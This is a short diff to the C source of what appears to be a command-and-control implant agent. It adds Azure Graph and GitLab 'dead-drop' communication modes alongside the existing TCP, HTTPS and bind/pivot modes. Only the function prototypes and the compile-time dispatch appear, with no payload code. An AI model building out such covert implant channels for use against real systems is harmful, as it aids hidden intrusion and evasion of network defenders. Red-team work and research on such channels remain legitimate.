@@ -24,6 +24,8 @@
 void nax_tcp_main(NaxAgent *a);       /* tcp.c      — connect-out */
 void nax_https_main(NaxAgent *a);     /* https.c    — HTTPS connect-out */
 void nax_tcp_bind_main(NaxAgent *a);  /* tcp_bind.c — bind/pivot  */
+void nax_graph_main(NaxAgent *a);     /* graph.c    — Azure dead-drop */
+void nax_gitlab_main(NaxAgent *a);    /* gitlab.c   — GitLab dead-drop */
 
 /* ===== parse hex AES key ===== */
 static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len)
@@ -130,6 +132,10 @@ int agent_run(void)
 
 #if defined(NAX_HTTPS_MODE)
     nax_https_main(&agent);
+#elif defined(NAX_GRAPH_MODE)
+    nax_graph_main(&agent);
+#elif defined(NAX_GITLAB_MODE)
+    nax_gitlab_main(&agent);
 #else
     nax_tcp_main(&agent);
 #endif
